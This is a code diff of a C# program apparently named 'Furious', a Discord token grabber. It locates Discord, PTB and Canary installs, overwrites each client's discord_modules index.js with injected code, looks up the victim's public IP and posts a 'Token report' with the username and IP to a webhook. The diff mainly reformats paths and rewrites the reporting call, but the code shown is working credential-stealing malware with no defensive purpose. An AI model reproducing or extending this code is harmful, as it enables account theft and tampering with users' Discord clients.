@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Management;
@@ -51,40 +52,40 @@ namespace Furious
 
 		private static void InjectJS()
         {
-			if (Directory.Exists("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\discord"))
+			if (Directory.Exists(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discord"))
 			{
-				string[] discord = Directory.GetDirectories("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Discord");
+				string[] discord = Directory.GetDirectories(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\Discord");
 				foreach (string folderName in discord)
 				{
 					if (folderName.Contains("0."))
 					{
-						FileManagement.DiscordPath = folderName + "\\modules\\discord_modules\\index.js";
+						FileManagement.DiscordPath = folderName + @"\modules\discord_modules\index.js";
 						FileManagement.CleanFile(FileManagement.DiscordPath);
 						FileManagement.WriteDiscord(FileManagement.DiscordPath);
 					}
 				}
 			}
-			if (Directory.Exists("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\discordptb"))
+			if (Directory.Exists(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discordptb"))
 			{
-				string[] ptb = Directory.GetDirectories("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\discordptb");
+				string[] ptb = Directory.GetDirectories(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discordptb");
 				foreach (string folderName in ptb)
 				{
 					if (folderName.Contains("0."))
 					{
-						FileManagement.PTBPath = folderName + "\\modules\\discord_modules\\index.js";
+						FileManagement.PTBPath = folderName + @"\modules\discord_modules\index.js";
 						FileManagement.CleanFile(FileManagement.PTBPath);
 						FileManagement.WriteDiscord(FileManagement.PTBPath);
 					}
 				}
 			}
-			if (Directory.Exists("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\discordcanary"))
+			if (Directory.Exists(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discordcanary"))
 			{
-				string[] canary = Directory.GetDirectories("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\discordcanary");
+				string[] canary = Directory.GetDirectories(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discordcanary");
 				foreach (string folderName in canary)
 				{
 					if (folderName.Contains("0."))
 					{
-						FileManagement.CanaryPath = folderName + "\\modules\\discord_modules\\index.js";
+						FileManagement.CanaryPath = folderName + @"\modules\discord_modules\index.js";
 						FileManagement.CleanFile(FileManagement.CanaryPath);
 						FileManagement.WriteDiscord(FileManagement.CanaryPath);
 					}
@@ -103,14 +104,10 @@ namespace Furious
 			}
 		}
 
-		private static async Task<string> GrabIP()
+		private static string GrabIP()
 		{
-			string result;
-			using (WebClient webClient = new WebClient())
-			{
-				result = await webClient.DownloadStringTaskAsync("https://ipv4.icanhazip.com/");
-			}
-			return result;
+			var addy = new WebClient().DownloadString("https://ipv4.icanhazip.com");
+			return addy;
 		}
 
 		public static void SendIP()
@@ -121,7 +118,12 @@ namespace Furious
 			{
 				try
 				{
-					httpClient.PostAsync(hook, new StringContent(Environment.UserName + ": " + Grabber.GrabIP()));
+					Dictionary<string, string> contents = new Dictionary<string, string>
+					{
+						{ "content", $"Token report for '{ Environment.UserName }' { Grabber.GrabIP() }" }
+					};
+
+					httpClient.PostAsync(hook, new FormUrlEncodedContent(contents)).GetAwaiter().GetResult();
 				}
 				catch (HttpRequestException ex)
 				{
